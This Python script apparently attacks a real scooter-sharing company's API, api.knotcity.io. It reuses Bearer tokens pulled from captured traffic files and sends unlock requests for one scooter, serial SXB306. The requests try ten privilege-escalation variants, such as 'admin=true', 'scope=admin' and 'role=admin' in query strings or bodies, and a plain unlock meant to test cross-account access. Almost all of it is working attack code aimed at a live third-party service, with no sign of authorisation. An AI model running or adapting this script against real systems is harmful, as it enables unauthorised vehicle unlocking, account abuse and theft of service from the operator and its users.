#!/usr/bin/env python3
"""
SXB306 Admin Escalation Test
Tests SXB306 unlock using the discovered admin privilege escalation vulnerability
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# SXB306 Scooter Configuration
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,  # Paris coordinates
    "lng": 2.3522
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def test_sxb306_admin_escalation(token):
    """Test SXB306 unlock using admin privilege escalation"""
    print("=" * 80)
    print("[ADMIN ESCALATION] SXB306 ADMIN PRIVILEGE ESCALATION TEST")
    print("=" * 80)
    print(f"[TARGET] Scooter: {SXB306_SCOOTER['serial']}")
    print(f"[LOCATION] Lat: {SXB306_SCOOTER['lat']}, Lng: {SXB306_SCOOTER['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print(f"[ATTACK] Using discovered admin privilege escalation vulnerability")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test the most effective admin escalation methods discovered
    admin_escalation_tests = [
        {
            "name": "Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?admin=true",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Force Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?force=true",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Scope Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?scope=admin",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Role Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?role=admin",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Permission Admin Query Parameter",
            "endpoint": "/api/application/vehicles/unlock?permission=admin",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Admin + Force Combined",
            "endpoint": "/api/application/vehicles/unlock?admin=true&force=true",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Admin + Scope Combined",
            "endpoint": "/api/application/vehicles/unlock?admin=true&scope=admin",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "force": True
            }
        },
        {
            "name": "Admin Payload Parameter",
            "endpoint": "/api/application/vehicles/unlock",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "admin": True,
                "force": True
            }
        },
        {
            "name": "Scope Payload Parameter",
            "endpoint": "/api/application/vehicles/unlock",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "scope": "admin",
                "force": True
            }
        },
        {
            "name": "Role Payload Parameter",
            "endpoint": "/api/application/vehicles/unlock",
            "payload": {
                "serial_number": SXB306_SCOOTER['serial'],
                "lat": SXB306_SCOOTER['lat'],
                "lng": SXB306_SCOOTER['lng'],
                "role": "admin",
                "force": True
            }
        }
    ]
    
    successful_attacks = []
    
    for i, test in enumerate(admin_escalation_tests, 1):
        print(f"\n[TEST {i}] {test['name']}")
        print(f"   Endpoint: {test['endpoint']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}{test['endpoint']}",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] SXB306 UNLOCKED with {test['name']}!")
                print(f"   [CRITICAL] ADMIN ESCALATION VULNERABILITY CONFIRMED!")
                successful_attacks.append({
                    'name': test['name'],
                    'endpoint': test['endpoint'],
                    'payload': test['payload'],
                    'status': response.status_code,
                    'response': response.text
                })
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            elif response.status_code == 403:
                print(f"   [ERROR] Permission denied - admin escalation failed")
            elif response.status_code == 400:
                print(f"   [ERROR] Bad request")
                try:
                    error_data = response.json()
                    print(f"   Error: {error_data}")
                except:
                    print(f"   Raw error: {response.text}")
            else:
                print(f"   [ERROR] Unexpected response: {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_attacks

def test_regular_unlock_for_comparison(token):
    """Test regular unlock for comparison"""
    print("\n" + "=" * 80)
    print("[COMPARISON] REGULAR UNLOCK TEST")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Regular unlock payload
    regular_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng']
    }
    
    print(f"[REGULAR TEST] Trying regular unlock payload:")
    print(f"   Endpoint: /api/application/vehicles/unlock")
    print(f"   Payload: {json.dumps(regular_payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=regular_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] SXB306 REGULAR UNLOCKED!")
            return True
        else:
            print(f"[FAILED] Regular unlock failed: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Regular unlock request failed: {e}")
        return False

def main():
    print("=" * 80)
    print("[SXB306] ADMIN ESCALATION UNLOCK TEST")
    print("=" * 80)
    print("[WARNING] Testing admin privilege escalation on SXB306!")
    print("[WARNING] Using discovered vulnerability to bypass restrictions!")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    # Test admin escalation
    successful_attacks = test_sxb306_admin_escalation(token)
    
    # Test regular unlock for comparison
    regular_success = test_regular_unlock_for_comparison(token)
    
    print("\n" + "=" * 80)
    print("[RESULTS] SXB306 ADMIN ESCALATION TEST RESULTS")
    print("=" * 80)
    
    if successful_attacks:
        print(f"[CRITICAL] FOUND {len(successful_attacks)} WORKING ADMIN ESCALATION METHODS!")
        print("[CRITICAL] ADMIN PRIVILEGE ESCALATION VULNERABILITY CONFIRMED!")
        print("[CRITICAL] SXB306 CAN BE UNLOCKED WITH ADMIN PRIVILEGES!")
        
        for i, attack in enumerate(successful_attacks, 1):
            print(f"\n[SUCCESS {i}] Working Admin Escalation Method:")
            print(f"   Method: {attack['name']}")
            print(f"   Endpoint: {attack['endpoint']}")
            print(f"   Payload: {json.dumps(attack['payload'], indent=2)}")
            print(f"   Status: {attack['status']}")
            print(f"   Response: {attack['response']}")
    elif regular_success:
        print("[WARNING] REGULAR UNLOCK SUCCESSFUL!")
        print("[WARNING] Cross-account access vulnerability confirmed!")
        print("[INFO] Admin escalation not needed - regular access works")
    else:
        print("[OK] Both admin escalation and regular unlock failed")
        print("[OK] Security appears to be working properly")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
